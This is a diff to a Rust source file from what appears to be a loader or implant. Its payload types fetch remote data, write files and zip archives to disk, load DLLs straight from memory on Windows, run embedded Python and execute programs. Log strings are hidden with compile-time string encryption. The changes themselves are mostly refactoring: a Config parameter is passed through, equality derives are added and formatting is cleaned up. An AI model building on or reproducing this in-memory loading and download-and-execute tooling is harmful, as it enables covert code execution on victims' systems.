@@ -23,6 +23,7 @@ use std::io::stdout;
 use std::io::Write;
 
 use crate::link::{Link, LinkFetch};
+use crate::config::Config;
 
 use cryptify::encrypt_string;
 
@@ -32,17 +33,18 @@ use std::fs::File;
 
 use crate::payload_util::calculate_path;
 use crate::payload_util::create_diretory;
+#[cfg(target_os = "linux")]
+use crate::payload_util::fail_linux_message;
 use crate::payload_util::same_hash_sha512;
 #[cfg(target_os = "linux")]
 use crate::payload_util::set_permission;
-#[cfg(target_os = "linux")]
-use crate::payload_util::fail_linux_message;
 
 pub enum PayloadExec {
     NoThread(),
     Thread(thread::JoinHandle<()>, Payload),
 }
 
+#[derive(PartialEq)]
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub enum Payload {
     DllFromMemory(DllFromMemory),
@@ -53,14 +55,14 @@ pub enum Payload {
     Exec(Exec),
 }
 impl Payload {
-    pub fn exec_payload(&self) -> PayloadExec {
+    pub fn exec_payload(&self,config:&Config) -> PayloadExec {
         let exec_result = match &self {
             Payload::Banner() => banner(),
-            Payload::WriteFile(payload) => payload.write_file(),
-            Payload::WriteZip(payload) => payload.write_zip(),
+            Payload::WriteFile(payload) => payload.write_file(config),
+            Payload::WriteZip(payload) => payload.write_zip(config),
             Payload::Exec(payload) => payload.exec_file(),
             Payload::ExecPython(payload) => payload.exec_python_with_embedder(),
-            Payload::DllFromMemory(payload) => payload.dll_from_memory(),
+            Payload::DllFromMemory(payload) => payload.dll_from_memory(config),
         };
         match exec_result {
             Ok(a) => a,
@@ -76,6 +78,9 @@ impl Payload {
     pub fn print_payload_compact(&self) {
         debug!("+{:?}", self);
     }
+    pub fn string_payload_compact(&self) -> String {
+        format!("{:?}", self)
+    }
     pub fn is_same_payload(&self, other_payload: &Payload) -> bool {
         let self_serialized = serde_json::to_string(self).unwrap();
         let other_serialized = serde_json::to_string(other_payload).unwrap();
@@ -87,7 +92,7 @@ impl Payload {
     ) -> bool {
         for running_payload in &mut *running_thread {
             if self.is_same_payload(&running_payload.1) {
-                info!("{}",encrypt_string!("Payload is already running"));
+                info!("{}", encrypt_string!("Payload is already running"));
                 return true;
             }
         }
@@ -95,6 +100,7 @@ impl Payload {
     }
 }
 
+#[derive(PartialEq)]
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct DllFromMemory {
     pub link: Link,
@@ -104,14 +110,14 @@ pub struct DllFromMemory {
 
 impl DllFromMemory {
     #[cfg(target_os = "linux")]
-    pub fn dll_from_memory(&self) -> Result<PayloadExec, anyhow::Error> {
-        fail_linux_message(format!("{}",encrypt_string!("DllFromMemory")));
+    pub fn dll_from_memory(&self,_config:&Config) -> Result<PayloadExec, anyhow::Error> {
+        fail_linux_message(format!("{}", encrypt_string!("DllFromMemory")));
         Ok(PayloadExec::NoThread())
     }
 
     #[cfg(target_os = "windows")]
-    pub fn dll_from_memory(&self) -> Result<PayloadExec, anyhow::Error> {
-        let data: Vec<u8> = self.link.fetch_data()?;
+    pub fn dll_from_memory(&self,config:&Config) -> Result<PayloadExec, anyhow::Error> {
+        let data: Vec<u8> = self.link.fetch_data(config)?;
 
         if self.thread {
             let thread_dll_entrypoint = self.dll_entrypoint.clone();
@@ -161,6 +167,7 @@ impl DllFromMemory {
     }
 }
 
+#[derive(PartialEq)]
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct ExecPython {
     pub path: String, //path of python directory
@@ -170,7 +177,7 @@ pub struct ExecPython {
 impl ExecPython {
     #[cfg(target_os = "linux")]
     pub fn exec_python_with_embedder(&self) -> Result<PayloadExec, anyhow::Error> {
-        fail_linux_message(format!("{}",encrypt_string!("ExecPython")));
+        fail_linux_message(format!("{}", encrypt_string!("ExecPython")));
         Ok(PayloadExec::NoThread())
     }
 
@@ -234,6 +241,7 @@ pub fn banner() -> Result<PayloadExec, anyhow::Error> {
     Ok(PayloadExec::NoThread())
 }
 
+#[derive(PartialEq)]
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct WriteZip {
     pub link: Link,
@@ -241,14 +249,14 @@ pub struct WriteZip {
 }
 
 impl WriteZip {
-    pub fn write_zip(&self) -> Result<PayloadExec, anyhow::Error> {
+    pub fn write_zip(&self,config:&Config) -> Result<PayloadExec, anyhow::Error> {
         //TODO found a way, not to recreate everything every time this payload run
         let path: PathBuf = calculate_path(&self.path)?;
         let _ = create_diretory(&path)?;
 
-        let archive: Vec<u8> = self.link.fetch_data()?;
+        let archive: Vec<u8> = self.link.fetch_data(config)?;
 
-        info!("{}{:?}",encrypt_string!("[+] Write zip: "), path);
+        info!("{}{:?}", encrypt_string!("[+] Write zip: "), path);
         match zip_extract::extract(Cursor::new(archive), &path, true) {
             Ok(_) => {}
             Err(error) => {
@@ -264,6 +272,7 @@ impl WriteZip {
     }
 }
 
+#[derive(PartialEq)]
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct WriteFile {
     pub link: Link,
@@ -272,24 +281,25 @@ pub struct WriteFile {
 }
 
 impl WriteFile {
-    pub fn write_file(&self) -> Result<PayloadExec, anyhow::Error> {
+    pub fn write_file(&self,config:&Config) -> Result<PayloadExec, anyhow::Error> {
         let path: PathBuf = calculate_path(&self.path)?;
 
         if same_hash_sha512(&self.hash, &path) == false {
             let _ = create_diretory(&path)?;
 
-            let body: Vec<u8> = self.link.fetch_data()?;
+            let body: Vec<u8> = self.link.fetch_data(config)?;
 
-            info!("{}{:?}",encrypt_string!("[+] Write file: "), path);
+            info!("{}{:?}", encrypt_string!("[+] Write file: "), path);
             let mut f = File::create(&path)?;
             f.write_all(&body)?;
         } else {
-            info!("{}{:?}",encrypt_string!("[+] No Write, same hash: "), path);
+            info!("{}{:?}", encrypt_string!("[+] No Write, same hash: "), path);
         }
         Ok(PayloadExec::NoThread())
     }
 }
 
+#[derive(PartialEq)]
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct Exec {
     pub path: String,
@@ -300,7 +310,7 @@ impl Exec {
     // https://doc.rust-lang.org/std/process/struct.Command.html
     pub fn exec_file(&self) -> Result<PayloadExec, anyhow::Error> {
         let path: PathBuf = calculate_path(&self.path)?;
-        info!("{}{:?} {}",encrypt_string!("Exec "), &path, &self.cmdline);
+        info!("{}{:?} {}", encrypt_string!("Exec "), &path, &self.cmdline);
         let mut comm = Command::new(&path);
 
         #[cfg(target_os = "linux")]
